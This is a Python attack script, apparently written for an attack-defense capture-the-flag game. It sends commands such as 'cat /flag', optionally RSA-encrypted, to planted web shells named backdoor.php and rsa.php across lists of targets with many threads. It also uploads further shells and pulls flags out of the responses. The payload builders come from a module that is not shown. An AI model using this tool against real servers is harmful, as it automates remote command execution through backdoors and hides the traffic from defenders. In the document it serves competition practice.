#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import base64

from common import logger, rsa_encrypt, rsa_decrypt
from config import FLAG_PATTERN
from mix import NormalRequest, MixRequest
from exps import *


def attack_upload_shell_eval():
    pass


def upload_shell_rce():
    pass


def upload_agent():
    pass


def attack_upload_shell():
    payload = exp_upload_shell_rsa_abs()
    req = NormalRequest("backdoor.php", {"1": payload}, ['127.0.0.1:8085'])
    req.callback = callback_log
    req.start(1)


def callback_log(t, c):
    logger.info("[+] ====== Recv Data ======")
    logger.debug(c)
    m = FLAG_PATTERN.findall(c)
    if m and m[0] and m[0][3]:
        logger.info("[+] Recv Flag : %s -> [[%s]]" % (t, m[0][3]))
    logger.info("[+] ====== Recv Data ======")


def attack_by_mix_request(targets, shell, payload, threads=10, callback=None, rsa=0):
    logger.info("[+] Init MixRequest...")
    if rsa and not isinstance(payload, dict):
        req = MixRequest(shell, payload, targets, rsa)
    else:
        req = MixRequest(shell, payload, targets)
    if callback:
        req.callback.append(callback_log)
    req.start(threads)


def attack_by_normal_request(targets, shell, payload, threads=10, callback=None, rsa=0):
    logger.info("[+] Init NormalRequest...")
    if rsa and not isinstance(payload, dict):
        req = NormalRequest(shell, payload, targets, rsa)
    else:
        req = NormalRequest(shell, payload, targets)
    if not callback:
        req.callback.append(callback_log)
    req.start(threads)


def test_attack_by_normal_request():
    # logger.debug("[+] Start Test EXP...")
    # payload = {
    #     "1": exp_system('cat /flag')
    # }
    # attack_by_normal_request(['127.0.0.1:8085'], "/backdoor.php", payload, 1)
    logger.debug("[+] Start Test RSA EXP...")
    payload = exp_system('cat /flag')
    payload = rsa_encrypt(payload)
    # logger.toggleDebug()
    # payload = exp_upload_shell_rsa_abs()
    attack_by_normal_request(['127.0.0.1:8085'], "/rsa.php", payload, 1, rsa=1)


def test_rsa():
    logger.debug("[+] Start Test RSA...")
    a = rsa_encrypt('test'+'asdveaw' * 100)
    b = rsa_decrypt(a)
    print(a, b)


if __name__ == '__main__':
    logger.info("[+] Start...")
    # test()
    test_attack_by_normal_request()
